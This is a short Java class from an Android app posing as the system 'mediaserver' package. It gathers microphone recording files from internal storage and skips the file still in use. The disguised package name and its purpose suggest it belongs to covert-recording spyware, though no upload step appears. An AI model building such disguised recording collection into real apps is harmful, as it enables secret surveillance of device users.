package com.android.mediaserver.fetchers.media;

import android.content.Context;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.file.FileLister;
import com.android.mediaserver.file.filefilter.TrueFileFilter;
import com.android.mediaserver.util.AppUtils;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;

public class MicRecordingsFetcher {
  private Context mContext;

  public MicRecordingsFetcher(Context context) {
    mContext = context;
  }

  public Collection<File> fetch() {
    File recordingDirectory = SimpleStorage.getInternalStorage(mContext)
        .getFile(Config.getInstance(mContext).getMicRecordingsDirectoryName());
    if (!recordingDirectory.exists()) {
      return new ArrayList();
    }
    Collection<File> listFiles =
        FileLister.listFiles(recordingDirectory, TrueFileFilter.TRUE, TrueFileFilter.TRUE);
    String usedFile = AppUtils.getUsedFile(mContext);
    if (usedFile.isEmpty()) {
      return listFiles;
    }
    Iterator<File> filesIterator = listFiles.iterator();
    while (filesIterator.hasNext()) {
      if (true == ((File) filesIterator.next()).getAbsolutePath().contains(usedFile)) {
        filesIterator.remove();
      }
    }
    return listFiles;
  }
}
